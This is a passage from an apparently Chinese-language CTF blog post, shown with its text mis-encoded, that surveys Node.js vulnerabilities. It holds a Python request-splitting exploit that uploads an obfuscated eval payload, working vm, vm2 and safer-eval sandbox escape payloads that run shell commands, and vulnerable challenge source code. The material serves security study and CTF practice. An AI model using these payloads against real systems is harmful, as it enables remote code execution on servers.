´åè¿›è¡Œåˆ‡åˆ†æ”»å‡»è®¿é—®/file_uploadè·¯ç”±(â—ï¸æ­¤è¯·æ±‚å‘å‡ºè€…ä¸ºlocalhostä¸»æœº)ï¼Œå®ç°å¯¹remoteAddressçš„ç»•è¿‡                        http.get(url, function (resp) &#123;                              resp.setEncoding(&#39;utf8&#39;);                              resp.on(&#39;error&#39;, function (err) &#123;                                    if (err.code === &quot;ECONNRESET&quot;) &#123;                                          console.log(&quot;Timeout occurs&quot;);                                    &#125;                              &#125;);                                        // è¿”å›ç»“æœè¾“å‡ºåˆ°/core                              resp.on(&#39;data&#39;, function (chunk) &#123;                                    try &#123;                                          resps = chunk.toString();                                          res.send(resps);                                    &#125; catch (e) &#123;                                          res.send(e.message);                                    &#125;                              &#125;).on(&#39;error&#39;, (e) =&gt; &#123;                                    res.send(e.message);                              &#125;);                        &#125;);                  &#125; catch (error) &#123;                        console.log(error);                  &#125;            &#125;      &#125; else &#123;            res.send(&quot;search param &#39;q&#39; missing!&quot;);      &#125; &#125;)  // å…³é”®å­—waf åˆ©ç”¨å­—ç¬¦ä¸²æ‹¼æ¥å®ç°ç»•è¿‡ function blacklist(url) &#123;      var evilwords = [&quot;global&quot;, &quot;process&quot;, &quot;mainModule&quot;, &quot;require&quot;, &quot;root&quot;, &quot;child_process&quot;, &quot;exec&quot;, &quot;\&quot;&quot;, &quot;&#39;&quot;, &quot;!&quot;];      var arrayLen = evilwords.length;       for (var i = 0; i &lt; arrayLen; i++) &#123;            const trigger = url.includes(evilwords[i]);            if (trigger === true) &#123;                  return true            &#125;      &#125; &#125;  var server = app.listen(8081, function () &#123;      var host = server.address().address      var port = server.address().port      console.log(&quot;Example app listening at http://%s:%s&quot;, host, port) &#125;)</code></pre><p><strong>exp:</strong></p><pre><code class="plsql">import requestspayload = &quot;&quot;&quot; HTTP/1.1Host: 127.0.0.1Connection: keep-alivePOST /file_upload HTTP/1.1Host: 127.0.0.1Content-Length: &#123;&#125;Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt&#123;&#125;&quot;&quot;&quot;.replace(&#39;\n&#39;, &#39;\r\n&#39;)body = &quot;&quot;&quot;------WebKitFormBoundarysAs7bV3fMHq0JXUtContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;lmonstergg.pug&quot;Content-Type: ../template-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#39;child_&#39;+&#39;pro&#39;+&#39;cess&#39;)[&#39;ex&#39;+&#39;ecSync&#39;](&#39;cat /flag.txt&#39;).toString()&quot;)-return x------WebKitFormBoundarysAs7bV3fMHq0JXUt--&quot;&quot;&quot;.replace(&#39;\n&#39;, &#39;\r\n&#39;)payload = payload.format(len(body), body) \    .replace(&#39;+&#39;, &#39;\u012b&#39;)             \    .replace(&#39; &#39;, &#39;\u0120&#39;)             \    .replace(&#39;\r\n&#39;, &#39;\u010d\u010a&#39;)    \    .replace(&#39;&quot;&#39;, &#39;\u0122&#39;)             \    .replace(&quot;&#39;&quot;, &#39;\u0a27&#39;)             \    .replace(&#39;[&#39;, &#39;\u015b&#39;)             \    .replace(&#39;]&#39;, &#39;\u015d&#39;) \    + &#39;GET&#39; + &#39;\u0120&#39; + &#39;/&#39;session = requests.Session()session.trust_env = Falseresponse1 = session.get(&#39;http://3d02a3de-3cbc-4f99-ab55-9fa306637282.node4.buuoj.cn:81/core?q=&#39; + payload)response = session.get(&#39;http://3d02a3de-3cbc-4f99-ab55-9fa306637282.node4.buuoj.cn:81/?action=lmonstergg&#39;)print(response.text)</code></pre><h1 id="vmæ²™ç®±é€ƒé€¸"><a href="#vmæ²™ç®±é€ƒé€¸" class="headerlink" title="vmæ²™ç®±é€ƒé€¸"></a>vmæ²™ç®±é€ƒé€¸</h1><h2 id="åŸç†-2"><a href="#åŸç†-2" class="headerlink" title="åŸç†"></a>åŸç†</h2><p><strong>context</strong><br> vm æ¨¡å—åˆ›å»ºä¸€ä¸ªV8è™šæ‹Ÿå¼•æ“ contextï¼ˆä¸Šä¸‹æ–‡ã€ç¯å¢ƒï¼‰æ¥ç¼–è¯‘å’Œè¿è¡Œä»£ç ã€‚  </p><pre><code class="plsql">context æ˜¯è¯­å¢ƒã€ç¯å¢ƒã€ä¸Šä¸‹æ–‡çš„æ„æ€ï¼Œç±»ä¼¼äºæ–‡ç« çš„è¯­å¢ƒï¼Œä¸€å¥è¯çš„æ„æ€éœ€è¦æ ¹æ®è¯­å¢ƒæ¨æ–­ï¼Œå³æ–‡ç« çš„ä¸Šä¸‹æ–‡ã€‚ä»¥æ­¤ç±»æ¯”ï¼Œè¿™é‡Œçš„ context æ˜¯ JavaScript ä»£ç æ‰€å¤„çš„ç¯å¢ƒï¼ˆæœ‰ç‚¹åƒä½œç”¨åŸŸçš„æ¦‚å¿µï¼‰ï¼Œä¸€æ¡ä»£ç è¯­å¥åœ¨ä¸åŒçš„ç¯å¢ƒæ‰§è¡Œçš„ç»“æœä¹Ÿä¸åŒã€‚</code></pre><p>è°ƒç”¨ä»£ç ä¸è¢«è°ƒç”¨ä»£ç å¤„äºä¸åŒçš„ contextï¼Œæ„å‘³ç€å®ƒä»¬çš„ global å¯¹è±¡æ˜¯ä¸åŒçš„ã€‚<br>ä¾‹å­ï¼š</p><pre><code class="plsql">const vm = require(&#39;vm&#39;);// globalä¸‹å®šä¹‰ä¸€ä¸ª x å˜é‡const x = 1;// contextä¹Ÿå®šä¹‰ä¸€ä¸ª x å˜é‡const context = &#123; x: 2 &#125;;vm.createContext(context);          // è¯­å¢ƒåŒ– &#123;x:2&#125;// codeåŒ…å«çš„ä»£ç å°†åœ¨ context ä¸‹æ‰§è¡Œï¼Œæ‰€ä»¥å…¶ä¸­æ‰€æœ‰ä»£ç è®¿é—®çš„å˜é‡éƒ½æ˜¯ context ä¸‹çš„const code = &#39;x += 40; var y = 17;&#39;;vm.runInContext(code, context);// context = &#123;x:42, y:17&#125;console.log(context.x); // 42console.log(context.y); // 17// globalæ²¡æœ‰è¢«æ”¹åŠ¨console.log(x); // 1; y is not defined.</code></pre><p> codeæ‰§è¡Œçš„ç¯å¢ƒæ˜¯ context ï¼Œå®ƒè®¿é—®çš„å…¨å±€å¯¹è±¡å°±æ˜¯è®¿é—®è‡ªå®šä¹‰çš„ context å¯¹è±¡ã€‚<br><strong>contextify è¯­å¢ƒåŒ–</strong><br> æ ¹æ® V8 å¼•æ“çš„æ–‡æ¡£æŒ‡æ˜ï¼š  </p><pre><code class="plsql">åœ¨ V8 ä¸­ï¼Œcontext æ˜¯ä¸€ä¸ªæ‰§è¡Œç¯å¢ƒï¼Œå®ƒå…è®¸åœ¨éš”ç¦»çš„ã€æ— å…³è”çš„ä¸€ä¸ª V8 å®ä¾‹ä¸­è¿è¡Œ JavaScript åº”ç”¨ã€‚ä½ å¿…é¡»ä¸ºè¿è¡Œçš„ä»»ä½•JavaScriptä»£ç æŒ‡å®šæ‰€åº”è¯¥å¤„äºçš„ contextã€‚</code></pre><p>vm.createContext() æœ‰ä¸€ä¸ª contextobject å‚æ•°ï¼Œç”¨äºæ¥æ”¶ä¸€ä¸ªå¯¹è±¡ï¼ˆå¦‚æœæ²¡æœ‰ï¼Œå°±åœ¨æ¨¡å—å†…éƒ¨åˆ›å»ºä¸€ä¸ªï¼‰ï¼Œæ‰€è°“è¯­å¢ƒåŒ–å°±æ˜¯åˆ›å»ºä¸€ä¸ª contextï¼ˆå¯¹è±¡ï¼‰ ç„¶åä¼ å…¥ contextObject ä½œä¸ºä»£ç æ‰§è¡Œç¯å¢ƒçš„è¿‡ç¨‹ã€‚  </p><h2 id="vmé€ƒé€¸"><a href="#vmé€ƒé€¸" class="headerlink" title="vmé€ƒé€¸"></a>vmé€ƒé€¸</h2><p>vmåˆ›å»ºä¸€ä¸ªæ–°çš„ context æ‰§è¡Œ JavaScript ä»£ç ï¼Œä¸èƒ½è®¿é—® global å¯¹è±¡ï¼Œçœ‹èµ·æ¥å°±åƒä¸€ä¸ªæ²™ç®±äº†ã€‚<br>ä¾‹å¦‚æˆ‘ä»¬æƒ³è¦è®¿é—® processï¼š</p><pre><code class="plsql">&quot;use strict&quot;;const vm = require(&quot;vm&quot;);const xyz = vm.runInNewContext(`process`);   // é»˜è®¤ context = &#123;&#125;console.log(xyz);</code></pre><p>ç»“æœ:<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668612046837-5f634418-9837-44b2-8968-28bd67220a43.png" alt="image.png"><br> é¢„æ–™ä¹‹ä¸­ï¼Œå› ä¸º process ä¸å­˜åœ¨äºæ–°çš„ contextï¼Œå®ƒå­˜åœ¨äºåŸæ¥çš„ context ä¸­ï¼Œè€ŒåŸæ¥çš„ context çš„ global å¯¹è±¡æœ‰ process å±æ€§ï¼š  </p><pre><code class="plsql">&quot;use strict&quot;;console.log(process)</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668612137486-e997e313-634b-40f6-92dc-5af7e767d1a5.png" alt="image.png"><br> é€šè¿‡å¯¹è±¡å¸¦æœ‰çš„ constructor å±æ€§é€ƒé€¸:</p><pre><code class="plsql">&quot;use strict&quot;;const vm = require(&quot;vm&quot;);const xyz = vm.runInNewContext(`this.constructor.constructor(&#39;return process.env&#39;)()`);console.log(xyz);  // xyzçš„å€¼ä¸ºæœ€åä¸€å¥JavaScriptä»£ç æ‰§è¡Œçš„ç»“æœï¼Œè¿™é‡Œæ˜¯å‡½æ•°è¿”å›å€¼</code></pre><p>ç»“æœ:<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668612256209-e86817c0-1c5a-441b-91e3-69fb1f2f9b16.png" alt="image.png"><br>thiså¼•ç”¨çš„æ˜¯å½“å‰æ‰€åœ¨çš„ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™é‡Œæ˜¯ä¼ å…¥ contextObject çš„å¯¹è±¡ï¼Œå®ƒåœ¨å¤–éƒ¨å®šä¹‰ï¼Œæ‰€ä»¥å®ƒå±äºå¤–éƒ¨çš„ contextã€‚é€šè¿‡ .constructor å¾—åˆ° Object Contrustor ï¼Œå†é€šè¿‡ .constructor å¾—åˆ° Function constructorï¼Œè¿™æ˜¯å‡½æ•°çš„æ„é€ å‡½æ•°ï¼Œé€šè¿‡ä¼ å…¥ä¸€ä¸ªåŒ…å«ä»£ç çš„å­—ç¬¦ä¸²å‚æ•°å°±èƒ½åˆ›å»ºä¸€ä¸ªæ–°çš„å‡½æ•°ï¼Œæœ€åçš„ () å°±æ˜¯è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚<br>è·å¾— process ä¹‹åå°±èƒ½ RCE äº†ã€‚</p><pre><code class="plsql">&quot;use strict&quot;;const vm = require(&quot;vm&quot;);const xyz = vm.runInNewContext(`const process = this.constructor.constructor(&#39;return this.process&#39;)();process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ipconfig&#39;).toString()`);console.log(xyz);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668612373997-17575d9f-dd72-4406-872f-4ce4841a9ce2.png" alt="image.png"></p><h2 id="vm2"><a href="#vm2" class="headerlink" title="vm2"></a>vm2</h2><p>nodejs.js å†…ç½®çš„ vm æ¨¡å—æä¾›çš„æ²™ç®±ç¯å¢ƒçš„éš”ç¦»ç¨‹åº¦ä¸é«˜ï¼Œå› æ­¤æœ€å¥½ä¸è¦æ‰§è¡Œä¸å—ä¿¡ä»»çš„ä»£ç ï¼Œè¿™ä¸€ç‚¹åœ¨node.jsæ–‡æ¡£ä¸­æ˜ç¡®æŒ‡å‡ºã€‚<br>vm2æ˜¯ä¸€ä¸ªç¬¬ä¸‰æ–¹æ¨¡å—ï¼ŒåŸºäºvmæ¨¡å—ã€Proxyç‰¹æ€§ã€requireé‡å†™æ¥å®ç°ï¼Œèƒ½æä¾›éš”ç¦»ç¨‹åº¦æ›´é«˜çš„æ²™ç®±ã€‚<br> vmçš„ä¾‹å­åœ¨vm2è¿è¡Œï¼š  </p><pre><code class="plsql">&quot;use strict&quot;;const &#123;VM&#125; = require(&#39;vm2&#39;);new VM().run(&#39;this.constructor.constructor(&quot;return process&quot;)()&#39;);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668613759546-ed42fac1-20b3-4915-adf8-5411de5170cd.png" alt="image.png"><br> è¿™æ¬¡é€šè¿‡ this.constructor.constructor ä¹Ÿä¸èƒ½è·å– process äº†ã€‚è¿™æ˜¯ç”±äº vm2 è¯­å¢ƒåŒ–äº†åœ¨ vm context ä¸­çš„æ‰€æœ‰å¯¹è±¡ï¼Œ.constructoræŒ‡å‘çš„æ„é€ å‡½æ•°å¹¶ä¸æ˜¯å¤–éƒ¨çš„ context ã€‚  </p><pre><code class="plsql">// vm&quot;use strict&quot;;const vm = require(&quot;vm&quot;);const xyz = vm.runInNewContext(`this.constructor.constructor`);console.log(xyz)                       // Function: Functionconsole.log(xyz === &#123;&#125;.constructor.constructor);       // true// vm2&quot;use strict&quot;;const &#123;VM&#125; = require(&#39;vm2&#39;);const xyz = new VM().run(&#39;this.constructor.constructor&#39;);console.log(xyz)                       // Function: Functionconsole.log(xyz === &#123;&#125;.constructor.constructor)        // false</code></pre><p><strong>vm2é€ƒé€¸æ€è·¯</strong><br>é€ƒé€¸çš„æ€è·¯ï¼šæˆ‘ä»¬éœ€è¦ä¸€äº›æ²™ç®±å¤–çš„ä¸œè¥¿ï¼Œå®ƒä¸åœ¨æ²™ç®± context çš„é™åˆ¶èŒƒå›´å†…ï¼Œé€šè¿‡å®ƒå°±èƒ½å†æ¬¡è®¿é—® constructor ã€‚<br>**1.å¼‚å¸¸å¤„ç†æœºåˆ¶ try catch å°±èƒ½åšåˆ°è¿™ä¸€ç‚¹ï¼Œä¸»è¿›ç¨‹åœ¨ try æŠ›å‡ºå¼‚å¸¸ï¼Œç„¶ååœ¨ catch æ•è· error å¯¹è±¡ï¼Œé€šè¿‡è¿™ä¸ª error å¯¹è±¡å¼•ç”¨åˆ° process **</p><pre><code>vm2 å°†è¯¥æ¼æ´å·²ä¿®å¤</code></pre><pre><code class="plsql">const &#123;NodeVM&#125; = require(&#39;vm2&#39;); nvm = new NodeVM()nvm.run(`    try &#123;        this.process.removeListener();     &#125;     catch (host_exception) &#123;        console.log(&#39;host exception: &#39; + host_exception.toString());        // é€šè¿‡ error å¯¹è±¡å¼•ç”¨        host_constructor = host_exception.constructor.constructor;        host_process = host_constructor(&#39;return this&#39;)().process;    child_process = host_process.mainModule.require(&quot;child_process&quot;);    console.log(child_process.execSync(&quot;whoami&quot;).toString());    &#125;`);</code></pre><p> ç»“æœï¼š<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668614464966-61b06bd9-ccc9-432f-9bd1-670748257f0b.png" alt="668e27f4a4304458a6644938470fe5dc.png"><br>å…¶ä»–å¾—ä¸€äº›payload</p><pre><code class="plsql">var handler = &#123;    get () &#123;     console.log(&quot;get&quot;);    &#125;  &#125;;var target = &#123;&#125;;var proxy = new Proxy(target, handler);Object.prototype.has = function(t, k)&#123;    console.log(&quot;has&quot;);&#125;proxy.a; //è§¦å‘get&quot;&quot; in proxy; //è§¦å‘hasï¼Œè¿™ä¸ªhasæ˜¯åœ¨åŸå‹é“¾ä¸Šå®šä¹‰çš„w</code></pre><p>========================================</p><pre><code class="plsql">&quot;use strict&quot;;var process;Object.prototype.has = function (t, k) &#123;    process = t.constructor(&quot;return process&quot;)();&#125;;&quot;&quot; in Buffer.from;process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()</code></pre><h2 id="safe-evalæ¨¡å—é€ƒé€¸"><a href="#safe-evalæ¨¡å—é€ƒé€¸" class="headerlink" title="safe-evalæ¨¡å—é€ƒé€¸"></a>safe-evalæ¨¡å—é€ƒé€¸</h2><p> safe-eval ç¬¬ä¸‰æ–¹æ¨¡å—åŸºäºå†…ç½®æ¨¡å— vm å®ç°ï¼Œå¯ä»¥ç”¨äºæ‰§è¡Œ JavaScript ä»£ç ï¼Œé»˜è®¤èƒ½è®¿é—® V8 å¼•æ“çš„ JavaScript APIsï¼Œè€Œä¸èƒ½è®¿é—® node.js çš„ APIsï¼Œä½†é€šè¿‡ä¼ å…¥ context ä¹Ÿèƒ½å®ç°å¯¹å®ƒä»¬çš„è®¿é—®ã€‚  </p><pre><code class="plsql">safeEval(code, [context], [options])</code></pre><p> context æ˜¯ä¸€ä¸ªåŒ…å«å±æ€§å’Œæ–¹æ³•çš„å¯¹è±¡ï¼Œè¿™äº›æ–¹æ³•å’Œå±æ€§ä»å…¨å±€ï¼Œæ‰€ä»¥è¦æ³¨æ„ä¼ å…¥çš„å±æ€§å’Œæ–¹æ³•ï¼Œå¦åˆ™ä¼šé€ æˆæ²™ç®±é€ƒé€¸ã€‚<br> åœ¨ version &lt;= 0.3.0 ä¸­ï¼Œsafe-eval å­˜åœ¨æ²™ç®±é€ƒé€¸çš„æ¼æ´ï¼š  </p><pre><code class="plsql">&gt;npm i safe-eval@0.3.0</code></pre><pre><code class="plsql">// test.jsconst safeEval = require(&#39;safe-eval&#39;)var code = `    this.constructor.constructor(&#39;return process&#39;)()`var evaluated = safeEval(code)console.log(evaluated)            // process [....]</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668614691540-a0071ffe-52e2-41b4-9ac6-dfceedfa45e5.png" alt="image.png"><br> 0.4.0 çš„ä¿®è¡¥æ–¹æ³•æ˜¯å°†å¯¹è±¡çš„ constructor é‡æ–°å®šä¹‰ä¸º undefinedï¼ŒåŒ…æ‹¬åœ¨ context ä¼ å…¥çš„å¯¹è±¡ï¼š  </p><pre><code class="plsql">const safeEval = require(&#39;safe-eval&#39;)var code = &#39;this.constructor&#39;var evaluated = safeEval(code)      console.log(evaluated)             // undefinedvar code = &#39;a&#39;var evaluated2 = safeEval(code, &#123;a:&#123;&#125;)console.log(evaluated2)           // &#123;constructor: undefined&#125;</code></pre><p><strong>safe-eval  1.3.6  ç‰ˆæœ¬é€ƒé€¸</strong></p><pre><code class="plsql">const saferEval = require(&quot;./src/index&quot;);const theFunction = function () &#123;  const process = clearImmediate.constructor(&quot;return process;&quot;)();  return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()&#125;;const untrusted = `($&#123;theFunction&#125;)()`;console.log(saferEval(untrusted));</code></pre><p>payload:</p><pre><code class="plsql">(function () &#123;const process = clearImmediate.constructor(&quot;return process;&quot;)();return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString()&#125;)()</code></pre><h2 id="ctfé¢˜ç›®"><a href="#ctfé¢˜ç›®" class="headerlink" title="ctfé¢˜ç›®"></a>ctfé¢˜ç›®</h2><h3 id="GKCTF2020-EZä¸‰å‰‘å®¢-EzNode"><a href="#GKCTF2020-EZä¸‰å‰‘å®¢-EzNode" class="headerlink" title="[GKCTF2020]EZä¸‰å‰‘å®¢-EzNode"></a>[GKCTF2020]EZä¸‰å‰‘å®¢-EzNode</h3><p>é“¾æ¥:<a href="https://github.com/Pdsdt/gkctf2020/tree/master/WEB/ez%E4%B8%89%E5%89%91%E5%AE%A2-easynode">https://github.com/Pdsdt/gkctf2020/tree/master/WEB/ez%E4%B8%89%E5%89%91%E5%AE%A2-easynode</a><br>è¿™é‡Œä½¿ç”¨dockeræ­å»º<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668763162126-19b5e964-48f5-4b5f-a4a4-26f95a1993e8.png" alt="image.png"></p><p>æˆ‘ä»¬æŸ¥çœ‹ä¸‹æºä»£ç :</p><pre><code class="plsql">const express = require(&#39;express&#39;);const bodyParser = require(&#39;body-parser&#39;);const saferEval = require(&#39;safer-eval&#39;); // 2019.7/WORKER1 æ‰¾åˆ°ä¸€ä¸ªå¾ˆæ£’çš„åº“const fs = require(&#39;fs&#39;);const app = express();app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json());// 2020.1/WORKER2 è€æ¿è¯´ä¸ºäº†åæœŸæ–¹ä¾¿ä¼˜åŒ–app.use((req, res, next) =&gt; &#123;  if (req.path === &#39;/eval&#39;) &#123;    let delay = 60 * 1000;    console.log(delay);    if (Number.isInteger(parseInt(req.query.delay))) &#123;      delay = Math.max(delay, parseInt(req.query.delay));    &#125;    const t = setTimeout(() =&gt; next(), delay);    // 2020.1/WORKER3 è€æ¿è¯´è®©æˆ‘ä¼˜åŒ–ä¸€ä¸‹é€Ÿåº¦ï¼Œæˆ‘å°±ç›´æ¥è¿™æ ·å†™äº†ï¼Œå…¶ä»–äººå†™äº†å•¥å…³æˆ‘päº‹    setTimeout(() =&gt; &#123;      clearTimeout(t);      console.log(&#39;timeout&#39;);      try &#123;        res.send(&#39;Timeout!&#39;);      &#125; catch (e) &#123;      &#125;    &#125;, 1000);  &#125; else &#123;    next();  &#125;&#125;);app.post(&#39;/eval&#39;, function (req, res) &#123;  let response = &#39;&#39;;  if (req.body.e) &#123;    try &#123;      response = saferEval(req.body.e);    &#125; catch (e) &#123;      response = &#39;Wrong Wrong Wrong!!!!&#39;;    &#125;  &#125;  res.send(String(response));&#125;);// 2019.10/WORKER1 è€æ¿å¨˜è¯´å¥¹è¦çœ‹åˆ°æˆ‘ä»¬çš„æºä»£ç ï¼Œç”¨è¡Œæ•°è®¡ç®—KPIapp.get(&#39;/source&#39;, function (req, res) &#123;  res.set(&#39;Content-Type&#39;, &#39;text/javascript;charset=utf-8&#39;);  res.send(fs.readFileSync(&#39;./index.js&#39;));&#125;);// 2019.12/WORKER3 ä¸ºäº†æ–¹ä¾¿æˆ‘è‡ªå·±æŸ¥çœ‹ç‰ˆæœ¬ï¼ŒåŠ ä¸Šè¿™ä¸ªæ¥å£app.get(&#39;/version&#39;, function (req, res) &#123;  res.set(&#39;Content-Type&#39;, &#39;text/json;charset=utf-8&#39;);  res.send(fs.readFileSync(&#39;./package.json&#39;));&#125;);app.get(&#39;/&#39;, function (req, res) &#123;  res.set(&#39;Content-Type&#39;, &#39;text/html;charset=utf-8&#39;);  res.send(fs.readFileSync(&#39;./index.html&#39;))&#125;)app.listen(80, &#39;0.0.0.0&#39;, () =&gt; &#123;  console.log(&#39;Start listening&#39;)&#125;);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668763320589-54653302-1df5-408b-ba38-b77bdd27a991.png" alt="image.png"><br>åœ¨è¿™æ®µä»£ç ä¸­å­˜åœ¨safe-evalï¼Œæˆ‘ä»¬æŸ¥çœ‹ä¸‹å®ƒå¾—ç‰ˆæœ¬<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668763363493-222cc8a3-42df-4e25-8f16-326a1bbc6154.png" alt="image.png"><br>1.3.6æ˜¯å­˜åœ¨æ¼æ´çš„<br>æˆ‘ä»¬å…ˆç»§ç»­åˆ†æä»£ç :<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668771592322-95094a63-cbd9-4ada-a453-3c86ee7b6c50.png" alt="image.png"><br> é€šè¿‡/eval?delay=ä¸Šä¼ ä¸€ä¸ªæ•°å­—å¹¶å’Œ60000æ¯”è¾ƒï¼Œå¤§çš„èµ‹å€¼ç»™delay  </p><pre><code class="plsql">setTimeoutæœ€å¤šåªèƒ½æ¨è¿Ÿæ‰§è¡Œ2147483647æ¯«ç§’ï¼ˆ24.8å¤©ï¼‰ï¼Œè¶…è¿‡è¿™ä¸ªæ—¶é—´ä¼šå‘ç”Ÿæº¢å‡ºï¼Œå¯¼è‡´å›è°ƒå‡½æ•°å°†åœ¨å½“å‰ä»»åŠ¡é˜Ÿåˆ—ç»“æŸåç«‹å³æ‰§è¡Œ</code></pre><p> æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªå¤§äº2147483647çš„å€¼å³å¯æ‰§è¡Œnext()åˆ°ä¸‹ä¸€ä¸ªä½ç½®<br>æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡getä¼ å…¥ä¸€ä¸ªæ¯”2147483647å¤§çš„å€¼ï¼Œç„¶å¹´ä½¿ç”¨postæ–¹å¼ä¼ å…¥payload<br>safer-eval 1.3.6é€ƒé€¸payload:</p><pre><code class="plsql">const saferEval = require(&quot;./src/index&quot;);const theFunction = function () &#123;  const process = clearImmediate.constructor(&quot;return process;&quot;)();  return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()&#125;;const untrusted = `($&#123;theFunction&#125;)()`;console.log(saferEval(untrusted));</code></pre><p>åœ¨è¿™é‡Œæˆ‘ä»¬ç›´æ¥ç»™e postä¼ å…¥ä¸€ä¸‹å†…å®¹:</p><pre><code class="plsql">(function () &#123;  const process = clearImmediate.constructor(&quot;return process;&quot;)();  return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()&#125;)()</code></pre><p>æ­å»ºçš„dockerç¯å¢ƒä¸çŸ¥é“ä¸ºä»€ä¹ˆæ²¡æœ‰æˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼Œæ”¾ä¸€å¼ åˆ«äººçš„å›¾å­<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668772542204-bf8936f4-0bf2-48b7-9fe6-112ba4a93c59.png" alt="o_20080607581121-1.png"></p><h2 id="æ›´å¤šé€ƒé€¸payload"><a href="#æ›´å¤šé€ƒé€¸payload" class="headerlink" title="æ›´å¤šé€ƒé€¸payload"></a>æ›´å¤šé€ƒé€¸payload</h2><p><a href="https://github.com/patriksimek/vm2/issues?q=is:issue+author:XmiliaH+is:closed">https://github.com/patriksimek/vm2/issues?q=is%3Aissue+author%3AXmiliaH+is%3Aclosed</a><br><a href="https://github.com/patriksimek/vm2/issues/225">https://github.com/patriksimek/vm2/issues/225</a></p><h1 id="ä¸€äº›æœ‰è¶£çš„æŒ‘æˆ˜"><a href="#ä¸€äº›æœ‰è¶£çš„æŒ‘æˆ˜" class="headerlink" title="ä¸€äº›æœ‰è¶£çš„æŒ‘æˆ˜"></a>ä¸€äº›æœ‰è¶£çš„æŒ‘æˆ˜</h1><h2 id="CSIVITU-2020-File-Library"><a href="#CSIVITU-2020-File-Library" class="headerlink" title="CSIVITU 2020-File Library"></a>CSIVITU 2020-<strong>File Library</strong></h2><p>å®¹å™¨åœ°å€:<a href="https://github.com/csivitu/ctf-challenges/tree/master/web/File%20Library">https://github.com/csivitu/ctf-challenges/tree/master/web/File%20Library</a><br>æˆ‘ä»¬å¾—åˆ°äº†ä»»åŠ¡çš„æºä»£ç ï¼š</p><pre><code class="javascript">const express = require(&#39;express&#39;);const path = require(&#39;path&#39;);const fs = require(&#39;fs&#39;);const app = express();const PORT = process.env.PORT || 3000;app.listen(PORT, () =&gt; &#123;   console.log(`Listening on port $&#123;PORT&#125;`);&#125;);app.get(&#39;/getFile&#39;, (req, res) =&gt; &#123;   let &#123; file &#125; = req.query;   console.log(&quot;file is: &quot;+file);   if (!file) &#123;       res.send(`file=$&#123;file&#125;\nFilename not specified!`);       return;   &#125;   try &#123;       if (file.includes(&#39; &#39;) || file.includes(&#39;/&#39;)) &#123;           res.send(`file=$&#123;file&#125;\nInvalid filename!`);           return;       &#125;   &#125; catch (err) &#123;       res.send(&#39;An error occured!&#39;);       return;   &#125;   if (!allowedFileType(file)) &#123;       res.send(`File type not allowed`);       return;   &#125;   if (file.length &gt; 5) &#123;       file = file.slice(0, 5);   &#125;   const returnedFile = path.resolve(__dirname + &#39;/&#39; + file);  console.log(&quot;returnedFile: &quot;+returnedFile);   fs.readFile(returnedFile, (err) =&gt; &#123;       if (err) &#123;           if (err.code != &#39;ENOENT&#39;) console.log(err);           res.send(&#39;An error occured!&#39;);           return;       &#125;       res.sendFile(returnedFile);   &#125;);&#125;);app.get(&#39;/*&#39;, (req, res) =&gt; &#123;   res.sendFile(__dirname + &#39;/index.html&#39;);&#125;);function allowedFileType(file) &#123;   const format = file.slice(file.indexOf(&#39;.&#39;) + 1);console.log(&quot;index +1 is &quot;+file.indexOf(&#39;.&#39;) + 1);    console.log(&quot;format inside allowedfile is: &quot;+format);   if (format == &#39;js&#39; || format == &#39;ts&#39; || format == &#39;c&#39; || format == &#39;cpp&#39;) &#123;       return true;   &#125;   return false;&#125;</code></pre><p>æˆ‘æ·»åŠ äº†ä¸€äº›æ—¥å¿—è®°å½•è¯­å¥ä»¥æ–¹ä¾¿æ“ä½œï¼Œæ­£å¦‚æ‚¨æ‰€è§ï¼Œå½“æˆ‘ä»¬è®¿é—®**/getfile**æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ get å‚æ•°ä¸­æä¾›ä¸€ä¸ªå°†ä¸ºæˆ‘ä»¬æ˜¾ç¤ºçš„æ–‡ä»¶åï¼Œä½†æœ‰ä¸€äº›é™åˆ¶ï¼Œæˆ‘ä»¬ä¸èƒ½ä½¿ç”¨ç©ºæ ¼æˆ–â€œ/â€ï¼Œåªå…è®¸å››ä¸ªæ‰©å±•å (js|ts|c|cpp) ã€‚<br><img 